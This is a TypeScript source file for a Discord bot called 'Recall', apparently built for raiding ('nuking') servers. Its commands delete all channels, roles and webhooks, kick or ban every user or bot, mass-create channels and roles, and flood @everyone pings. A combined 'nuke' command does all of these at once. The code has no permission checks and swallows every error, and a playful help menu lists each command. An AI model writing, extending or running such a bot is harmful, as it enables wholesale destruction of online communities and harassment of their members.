import { ChannelType, EmbedBuilder, Message } from 'discord.js'
import { CommandHandlers } from './types.js'

function createCommandHandlers(prefix: string): CommandHandlers {
  return {
    async dc(message: Message) {
      await message.reply('ya, imma delete all channels real quick 😵‍💫')
      const channels = message.guild?.channels.cache
      if (!channels) return
      
      await Promise.all(channels.map(channel => channel.delete().catch(() => {})))

      const newChannel = await message.guild?.channels.create({
        name: message.author.username,
        type: ChannelType.GuildText,
      })

      if (newChannel) {
        await newChannel.send('bleh! i deleted em all :p')
      }
    },

    async dr(message: Message) {
      await message.reply('roles? ew, deleting them rn 🙃')
      const roles = message.guild?.roles.cache.filter(role => role.id !== message.guild?.id)
      if (!roles) return
      
      await Promise.all(roles.map(role => role.delete().catch(() => {})))
      return message.reply('all roles r gone, feel better now? 🤨')
    },

    async cr(message: Message, args: string[]) {
      const amount = parseInt(args[0]) || 0
      if (amount <= 0 || amount > 100) {
        return message.reply('uhh no, gimme a valid number between 1-100 🙄')
      }

      await message.reply(`yah, i'm creating ${amount} roles for u rn :p`)
      
      if (!message.guild) return
      
      await Promise.all(
        Array.from({ length: amount }, async () => {
          const name = `role-${Math.random().toString(36).substring(2, 15)}`
          const color = Math.floor(Math.random() * 16777215)
          await message.guild?.roles.create({ name, color }).catch(() => {})
        })
      )

      return message.reply(`all ${amount} roles r done, happy now? 😵‍💫`)
    },

    async ka(message: Message) {
      await message.reply('omg, kicking all users rn 😭')
      const members = message.guild?.members.cache.filter(member => !member.user.bot)
      if (!members) return
      
      await Promise.all(members.map(member => member.kick().catch(() => {})))
      return message.reply('they r gone, like poof 😵‍💫')
    },

    async ba(message: Message) {
      await message.reply('banning all users rn, hope u know what ur doing :3')
      const members = message.guild?.members.cache.filter(member => !member.user.bot)
      if (!members) return
      
      await Promise.all(members.map(member => member.ban().catch(() => {})))
      return message.reply('yep, everyone is banned, savage 😭')
    },

    async mp(message: Message, args: string[]) {
      const amount = parseInt(args[0]) || 0
      if (amount <= 0) {
        return message.reply('umm no, gimme a valid number of pings 🙃')
      }

      await message.reply(`pinging @everyone ${amount} times, u r so annoying 😵‍💫`)
      const channels = message.guild?.channels.cache.filter(channel => 
        'isTextBased' in channel && typeof channel.isTextBased === 'function' && channel.isTextBased()
      )
      
      if (!channels) return

      await Promise.all(
        channels.map(channel =>
          Promise.all(
            Array.from({ length: amount }, () =>
              'send' in channel && typeof channel.send === 'function' 
                ? channel.send('@everyone').catch(() => {})
                : Promise.resolve()
            )
          )
        )
      )

      return message.reply('done, i pinged em, now they hate u too 😭')
    },

    async dw(message: Message) {
      await message.reply('webhooks? bye bye 🤨')
      const webhooks = await message.guild?.fetchWebhooks()
      if (!webhooks) return
      
      await Promise.all(webhooks.map(webhook => webhook.delete().catch(() => {})))
      return message.reply('all webhooks r gone, like magic :p')
    },

    async kb(message: Message) {
      await message.reply('kicking all bots rn, poor lil guys 😭')
      const bots = message.guild?.members.cache.filter(member => member.user.bot)
      if (!bots) return
      
      await Promise.all(bots.map(bot => bot.kick().catch(() => {})))
      return message.reply('bots kicked, they gonzo now 😵‍💫')
    },

    async bb(message: Message) {
      await message.reply('banning all bots rn, rip to them :3')
      const bots = message.guild?.members.cache.filter(member => member.user.bot)
      if (!bots) return
      
      await Promise.all(bots.map(bot => bot.ban().catch(() => {})))
      return message.reply('bots r banned, what a savage move 😭')
    },

    async k(message: Message, args: string[]) {
      const roleName = args.join(' ')
      const role = message.guild?.roles.cache.find(
        r => r.name === roleName || r.id === roleName
      )

      if (!role) {
        return message.reply('eww, role not found 🙄')
      }

      await message.reply(`kicking all users with the role ${roleName}, brb :3`)
      const membersWithRole = message.guild?.members.cache.filter(member =>
        member.roles.cache.has(role.id)
      )
      
      if (!membersWithRole) return
      
      await Promise.all(membersWithRole.map(member => member.kick().catch(() => {})))
      return message.reply(`they gone, no more ${roleName} ppl 😵‍💫`)
    },

    async b(message: Message, args: string[]) {
      const roleName = args.join(' ')
      const role = message.guild?.roles.cache.find(
        r => r.name === roleName || r.id === roleName
      )

      if (!role) {
        return message.reply('role? wat? not found 🙃')
      }

      await message.reply(`banning everyone with ${roleName}, this gon hurt 😭`)
      const membersWithRole = message.guild?.members.cache.filter(member =>
        member.roles.cache.has(role.id)
      )
      
      if (!membersWithRole) return
      
      await Promise.all(membersWithRole.map(member => member.ban().catch(() => {})))
      return message.reply(`they all banned, u r heartless 😵‍💫`)
    },

    async mc(message: Message, args: string[]) {
      const amount = parseInt(args[0]) || 0
      const isVoice = args.includes('-v')

      if (amount <= 0 || amount > 100) {
        return message.reply('nooo, pick a number between 1-100 🙄')
      }

      await message.reply(`making ${amount} ${isVoice ? 'voice' : 'text'} channels rn 🙃`)
      
      if (!message.guild) return
      
      await Promise.all(
        Array.from({ length: amount }, async () => {
          const name = `Channel-${Math.random().toString(36).substring(2, 15)}`
          await message.guild?.channels
            .create({
              name,
              type: isVoice ? ChannelType.GuildVoice : ChannelType.GuildText,
            })
            .catch(() => {})
        })
      )

      return message.reply(`done, made ${amount} channels, so cool right? 😵‍💫`)
    },

    async nuke(message: Message, args: string[]) {
      const [channelsAmount, mentionsAmount] = args.map(arg => parseInt(arg) || 0)
    
      if ('send' in message.channel && typeof message.channel.send === 'function') {
        await message.channel.send('bro u nuking the server? say less 🙄').catch(() => {})
      }

      if (!message.guild) return

      const guild = message.guild
      const roles = guild.roles.cache.filter(role => role.id !== guild.id)
      const channels = guild.channels.cache
    
      await Promise.all([
        ...roles.map(role => role.delete().catch(() => {})),
        ...channels.map(channel => channel.delete().catch(() => {})),
      ])
    
      const fChn = await guild.channels.create({
        name: 'post-apocalypse',
        type: ChannelType.GuildText,
      }).catch(() => null)
    
      if (fChn) {
        await fChn.send('the server is a wasteland now... but we rebuild here 🙃').catch(() => {})
      }
    
      const createdChannels = await Promise.all(
        Array.from({ length: channelsAmount }, async () => {
          const name = `Channel-${Math.random().toString(36).substring(2, 15)}`
          return guild?.channels.create({
            name,
            type: ChannelType.GuildText,
          }).catch(() => null)
        })
      )

      const allChannels = [fChn, ...createdChannels.filter(Boolean)]
      await Promise.all(
        allChannels.map(channel =>
          Promise.all(
            Array.from({ length: mentionsAmount }, () =>
              channel ? channel.send('@everyone').catch(() => {}) : Promise.resolve()
            )
          )
        )
      )

      if (fChn) {
        await fChn.send('lalalala').catch(() => {})
      }
    },

    async help(message: Message) {
      const embed = new EmbedBuilder()
        .setTitle('Recall Commands')
        .setColor('#2f3136') // invisible color
        .setDescription(`use the prefix \`${prefix}\` and one of these commands 😵‍💫`)
        .addFields(
          { name: `${prefix}dc`, value: 'delete all channels and recreate one named after u 🙄' },
          { name: `${prefix}dr`, value: 'delete all roles, poof, gone 😵‍💫' },
          { name: `${prefix}cr <amount>`, value: 'create a bunch of random roles (1-100) :p' },
          { name: `${prefix}ka`, value: 'kick all users who are not bots, rip to them 🙃' },
          { name: `${prefix}ba`, value: 'ban all users (not bots), kinda savage bro 😭' },
          { name: `${prefix}mp <amount>`, value: 'ping @everyone <amount> times, u r annoying 😵‍💫' },
          { name: `${prefix}dw`, value: 'delete all webhooks, bleh! 🙄' },
          { name: `${prefix}kb`, value: 'kick all bots, poor lil guys 😭' },
          { name: `${prefix}bb`, value: 'ban all bots, rip them forever 😵‍💫' },
          { name: `${prefix}k <role name>`, value: 'kick everyone with the specified role 🙃' },
          { name: `${prefix}b <role name>`, value: 'ban everyone with the specified role 😭' },
          { name: `${prefix}mc <amount> [-v]`, value: 'mass create <amount> channels, add -v 4 voice channels 😵‍💫' },
          { name: `${prefix}nuke <channels> <mentions>`, value: 'delete everything n recreate <channels>, ping <mentions> times 😭' }
        )
        .setFooter({ text: 'Recall' })
      
      return message.reply({ embeds: [embed] })
    }
  }
}

export function registerCommandAliases(handlers: CommandHandlers): void {
  handlers.commands = handlers.help
}

export default createCommandHandlers 